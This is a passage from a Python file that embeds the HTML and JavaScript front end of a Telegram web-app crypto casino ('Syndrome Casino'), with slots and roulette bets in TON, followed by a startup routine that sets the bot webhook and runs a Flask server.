                <div class="game-icon">🎡</div>
                <div class="game-name">РУЛЕТКА</div>
                <div class="game-bet">Ставка: 0.2 TON</div>
            </div>
            <div class="game-card" onclick="openGame('dice')">
                <div class="game-icon">🎲</div>
                <div class="game-name">КОСТИ</div>
                <div class="game-bet">Ставка: 0.15 TON</div>
            </div>
            <div class="game-card" onclick="openGame('blackjack')">
                <div class="game-icon">🃏</div>
                <div class="game-name">БЛЭКДЖЕК</div>
                <div class="game-bet">Ставка: 0.5 TON</div>
            </div>
        </div>
    </div>
    
    <div class="game-modal" id="slotsModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeGame()">✕</button>
            <div class="modal-title">🎰 СЛОТЫ</div>
            <div class="slot-container">
                <div class="slot-reel" id="reel1">🍒</div>
                <div class="slot-reel" id="reel2">🍋</div>
                <div class="slot-reel" id="reel3">💎</div>
            </div>
            <div id="slotsResult"></div>
            <button class="game-btn" onclick="spinSlots()">🎰 КРУТИТЬ (0.1 TON)</button>
        </div>
    </div>
    
    <div class="game-modal" id="rouletteModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeGame()">✕</button>
            <div class="modal-title">🎡 РУЛЕТКА</div>
            <div class="roulette-wheel" id="rouletteWheel">
                <div class="roulette-center">🎡</div>
            </div>
            <div id="rouletteResult"></div>
            <button class="game-btn" onclick="spinRoulette()">🎡 КРУТИТЬ (0.2 TON)</button>
        </div>
    </div>
    
    <div class="bottom-nav">
        <div class="nav-item active">
            <div class="nav-icon">🎮</div>
            <div class="nav-label">Игры</div>
        </div>
        <div class="nav-item" onclick="tg.openTelegramLink('https://t.me/SyndromeCasinoBot')">
            <div class="nav-icon">💎</div>
            <div class="nav-label">Пополнить</div>
        </div>
        <div class="nav-item" onclick="showToast('Приглашайте друзей! +20%', '👥')">
            <div class="nav-icon">👥</div>
            <div class="nav-label">Друзья</div>
        </div>
        <div class="nav-item" onclick="showToast('VIP статус активен', '👑')">
            <div class="nav-icon">👤</div>
            <div class="nav-label">Профиль</div>
        </div>
    </div>
    
    <div class="toast" id="toast" style="display: none;">
        <div class="toast-icon" id="toastIcon">💰</div>
        <div class="toast-message" id="toastMessage"></div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        document.documentElement.style.backgroundColor = '#0a0a1a';
        
        const user = tg.initDataUnsafe?.user || {};
        const userId = user.id || 123456789;
        const username = user.username || user.first_name || 'Player';
        
        document.getElementById('username').textContent = username;
        document.getElementById('avatar').textContent = username.charAt(0).toUpperCase();
        
        const API_URL = '/api';
        let balance = 0;
        let totalWins = 0;
        let totalGames = 0;
        let isSpinning = false;
        
        // Создание частиц
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 30; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 6 + 's';
                particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
                container.appendChild(particle);
            }
        }
        
        function showToast(message, icon = '💰') {
            const toast = document.getElementById('toast');
            document.getElementById('toastMessage').textContent = message;
            document.getElementById('toastIcon').textContent = icon;
            toast.style.display = 'flex';
            setTimeout(() => { toast.style.display = 'none'; }, 3000);
        }
        
        async function loadBalance() {
            try {
                const response = await fetch(`${API_URL}/user/${userId}`);
                const data = await response.json();
                balance = data.balance || 0;
                totalWins = data.totalWins || 0;
                totalGames = data.totalGames || 0;
                updateUI();
            } catch (error) {
                balance = 100; // Демо баланс
                updateUI();
            }
        }
        
        function updateUI() {
            document.getElementById('balance').textContent = balance.toFixed(2) + ' TON';
            document.getElementById('balanceUsd').textContent = '≈ $' + (balance * 2.5).toFixed(2) + ' USD';
            document.getElementById('totalWins').textContent = totalWins;
            document.getElementById('totalGames').textContent = totalGames;
            document.getElementById('winRate').textContent = totalGames > 0 ? Math.round((totalWins / totalGames) * 100) + '%' : '0%';
        }
        
        function openGame(game) {
            document.getElementById(`${game}Modal`).classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeGame() {
            document.querySelectorAll('.game-modal').forEach(modal => modal.classList.remove('active'));
            document.body.style.overflow = 'auto';
        }
        
        async function makeBet(gameType, betAmount) {
            if (balance < betAmount) {
                showToast('Недостаточно TON! Пополните баланс', '⚠️');
                return null;
            }
            if (isSpinning) return null;
            isSpinning = true;
            
            try {
                const response = await fetch(`${API_URL}/game`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: userId, game_type: gameType, bet_amount: betAmount })
                });
                const result = await response.json();
                
                if (result.win) {
                    balance += result.amount - betAmount;
                    totalWins++;
                } else {
                    balance -= betAmount;
                }
                totalGames++;
                updateUI();
                isSpinning = false;
                return result;
            } catch (error) {
                // Демо режим
                const win = Math.random() < 0.3;
                const result = { win, amount: win ? betAmount * (Math.floor(Math.random() * 5) + 2) : 0 };
                
                if (win) { balance += result.amount - betAmount; totalWins++; }
                else { balance -= betAmount; }
                totalGames++;
                updateUI();
                isSpinning = false;
                return result;
            }
        }
        
        async function spinSlots() {
            if (isSpinning) return;
            
            const symbols = ["🍒", "🍋", "🔔", "💎", "7️⃣", "🍇", "🎯"];
            const reels = [
                document.getElementById('reel1'),
                document.getElementById('reel2'),
                document.getElementById('reel3')
            ];
            
            reels.forEach(reel => reel.classList.add('spinning'));
            
            for (let i = 0; i < 15; i++) {
                reels.forEach(reel => { reel.textContent = symbols[Math.floor(Math.random() * symbols.length)]; });
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            reels.forEach(reel => reel.classList.remove('spinning'));
            
            const result = await makeBet('slots', 0.1);
            
            if (result && result.win) {
                reels.forEach(reel => reel.textContent = '💎');
                document.getElementById('slotsResult').innerHTML = `<div class="result-banner result-win">🎉 ДЖЕКПОТ! +${result.amount.toFixed(2)} TON</div>`;
                showToast(`Выигрыш: +${result.amount.toFixed(2)} TON! 🎉`, '🎉');
            } else {
                document.getElementById('slotsResult').innerHTML = `<div class="result-banner result-lose">😢 Не повезло! -0.1 TON</div>`;
            }
        }
        
        async function spinRoulette() {
            if (isSpinning) return;
            
            const wheel = document.getElementById('rouletteWheel');
            const spins = 5 + Math.floor(Math.random() * 5);
            const finalDegree = Math.floor(Math.random() * 360);
            const totalRotation = spins * 360 + finalDegree;
            
            wheel.style.transform = `rotate(${totalRotation}deg)`;
            
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            const result = await makeBet('roulette', 0.2);
            
            if (result && result.win) {
                document.getElementById('rouletteResult').innerHTML = `<div class="result-banner result-win">🎉 ПОБЕДА! +${result.amount.toFixed(2)} TON</div>`;
                showToast(`Выигрыш: +${result.amount.toFixed(2)} TON! 🎉`, '🎉');
            } else {
                document.getElementById('rouletteResult').innerHTML = `<div class="result-banner result-lose">😢 Мимо! -0.2 TON</div>`;
            }
            
            setTimeout(() => {
                wheel.style.transition = 'none';
                wheel.style.transform = 'rotate(0deg)';
                setTimeout(() => { wheel.style.transition = 'transform 3s cubic-bezier(0.17, 0.67, 0.12, 0.99)'; }, 100);
            }, 500);
        }
        
        createParticles();
        loadBalance();
        setInterval(loadBalance, 30000);
        
        console.log('🎰 SYNDROME CASINO ACTIVATED ON RENDER!');
    </script>
</body>
</html>
'''

# =================================================================
# ЗАПУСК ДЛЯ RENDER
# =================================================================
async def main():
    # Инициализация базы
    conn = init_db()
    conn.close()
    print("✅ База данных готова")
    
    # Настройка вебхука для бота
    webhook_url = f"https://{RENDER_URL}/webhook"
    await bot.set_webhook(url=webhook_url, drop_pending_updates=True)
    print(f"✅ Webhook установлен: {webhook_url}")
    
    # Настройка меню бота
    await bot.set_chat_menu_button(
        menu_button=MenuButtonWebApp(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=f"https://{RENDER_URL}"))
    )
    
    print("🔥 SYNDROME CASINO АКТИВЕН!")
    print(f"🌐 URL: https://{RENDER_URL}")
    print("💎 Готов к приёму депозитов!")

if __name__ == '__main__':
    # Запуск в отдельном потоке для Render
    import threading
    
    # Запускаем бота
    asyncio.run(main())
    
    # Запускаем Flask сервер
    port = int(os.environ.get('PORT', 8080))
    flask_app.run(host='0.0.0.0', port=port)
